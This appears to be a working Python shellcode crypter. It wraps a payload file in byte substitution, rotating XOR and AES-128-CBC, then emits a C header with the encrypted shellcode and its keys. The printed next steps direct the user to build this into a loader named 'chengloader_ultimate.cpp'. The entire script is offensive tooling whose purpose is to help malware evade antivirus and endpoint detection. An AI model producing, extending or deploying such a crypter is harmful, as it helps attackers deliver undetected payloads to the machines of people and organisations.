#!/usr/bin/env python3
# Advanced Multi-Layer Shellcode Encryption
# Layer 1: Byte substitution (custom S-box)
# Layer 2: XOR with rotating key
# Layer 3: AES-128-CBC

import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_sbox():
    """Generate a random substitution box"""
    sbox = list(range(256))
    import random
    random.shuffle(sbox)
    return sbox

def generate_inverse_sbox(sbox):
    """Generate inverse S-box for decryption"""
    inv_sbox = [0] * 256
    for i, val in enumerate(sbox):
        inv_sbox[val] = i
    return inv_sbox

def byte_substitution(data, sbox):
    """Apply byte substitution using S-box"""
    return bytes([sbox[b] for b in data])

def xor_encrypt_rotating(data, key):
    """XOR encryption with rotating key"""
    result = bytearray()
    key_len = len(key)
    for i, byte in enumerate(data):
        # Rotate key based on position
        key_byte = key[(i * 7) % key_len]  # Use prime number for better distribution
        result.append(byte ^ key_byte)
    return bytes(result)

def aes_encrypt(data, key, iv):
    """AES-128-CBC encryption"""
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    return cipher.encrypt(padded_data)

def format_c_array(data, name, bytes_per_line=12):
    """Format data as C array"""
    output = f"unsigned char {name}[] = {{\n"
    for i in range(0, len(data), bytes_per_line):
        chunk = data[i:i+bytes_per_line]
        hex_str = ", ".join([f"0x{b:02X}" for b in chunk])
        output += f"    {hex_str},\n"
    output = output.rstrip(",\n") + "\n};\n"
    return output

def main():
    print("[*] Advanced Multi-Layer Shellcode Encryption")
    print("[*] Layer 1: Byte Substitution")
    print("[*] Layer 2: XOR with Rotating Key")
    print("[*] Layer 3: AES-128-CBC")
    print()
    
    # Read shellcode
    input_file = "payload_x64.bin"
    if not os.path.exists(input_file):
        print(f"[ERROR] {input_file} not found!")
        return 1
    
    with open(input_file, "rb") as f:
        shellcode = f.read()
    
    print(f"[+] Read {len(shellcode)} bytes from {input_file}")
    
    # Generate encryption keys
    sbox = generate_sbox()
    inv_sbox = generate_inverse_sbox(sbox)
    xor_key = os.urandom(32)  # 32-byte XOR key
    aes_key = os.urandom(16)  # 16-byte AES key
    aes_iv = os.urandom(16)   # 16-byte AES IV
    
    print(f"[+] Generated S-box")
    print(f"[+] Generated XOR key: {xor_key.hex()}")
    print(f"[+] Generated AES key: {aes_key.hex()}")
    print(f"[+] Generated AES IV: {aes_iv.hex()}")
    
    # Layer 1: Byte substitution
    layer1 = byte_substitution(shellcode, sbox)
    print(f"[+] Layer 1 complete: Byte substitution")
    
    # Layer 2: XOR with rotating key
    layer2 = xor_encrypt_rotating(layer1, xor_key)
    print(f"[+] Layer 2 complete: XOR encryption")
    
    # Layer 3: AES encryption
    layer3 = aes_encrypt(layer2, aes_key, aes_iv)
    print(f"[+] Layer 3 complete: AES encryption")
    print(f"[+] Final encrypted size: {len(layer3)} bytes")
    
    # Save encrypted shellcode
    with open("payload_x64_advanced.bin", "wb") as f:
        f.write(layer3)
    print(f"[+] Saved to payload_x64_advanced.bin")
    
    # Generate C header
    c_code = "// Advanced Multi-Layer Encrypted Shellcode\n"
    c_code += "// Layer 1: Byte Substitution\n"
    c_code += "// Layer 2: XOR with Rotating Key\n"
    c_code += "// Layer 3: AES-128-CBC\n\n"
    
    # Inverse S-box (for decryption)
    c_code += "// Inverse S-box for byte substitution (256 bytes)\n"
    c_code += format_c_array(bytes(inv_sbox), "inv_sbox", 16)
    c_code += "\n"
    
    # XOR key
    c_code += "// XOR Key (32 bytes)\n"
    c_code += format_c_array(xor_key, "xor_key", 16)
    c_code += "\n"
    
    # AES key
    c_code += "// AES Key (16 bytes)\n"
    c_code += format_c_array(aes_key, "aes_key", 16)
    c_code += "\n"
    
    # AES IV
    c_code += "// AES IV (16 bytes)\n"
    c_code += format_c_array(aes_iv, "aes_iv", 16)
    c_code += "\n"
    
    # Encrypted shellcode
    c_code += f"// Encrypted Shellcode ({len(layer3)} bytes)\n"
    c_code += format_c_array(layer3, "encrypted_shellcode", 12)
    c_code += f"\nSIZE_T encrypted_size = sizeof(encrypted_shellcode);\n"
    
    with open("payload_x64_advanced.h", "w") as f:
        f.write(c_code)
    print(f"[+] Generated payload_x64_advanced.h")
    
    # Verify decryption
    print("\n[*] Verifying decryption...")
    
    # Decrypt Layer 3 (AES)
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    dec_layer3 = cipher.decrypt(layer3)
    # Remove padding
    padding_len = dec_layer3[-1]
    dec_layer2 = dec_layer3[:-padding_len]
    
    # Decrypt Layer 2 (XOR)
    dec_layer1 = xor_encrypt_rotating(dec_layer2, xor_key)
    
    # Decrypt Layer 1 (Byte substitution)
    decrypted = byte_substitution(dec_layer1, inv_sbox)
    
    if decrypted == shellcode:
        print("[+] Decryption verified successfully!")
    else:
        print("[ERROR] Decryption verification failed!")
        print(f"Original size: {len(shellcode)}, Decrypted size: {len(decrypted)}")
        return 1
    
    print("\n[SUCCESS] Advanced encryption complete!")
    print("\nNext steps:")
    print("1. Copy the content from payload_x64_advanced.h")
    print("2. Replace the encryption keys and shellcode in chengloader_ultimate.cpp")
    print("3. Update the decryption function to use 3-layer decryption")
    print("4. Run build_ultimate.bat")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
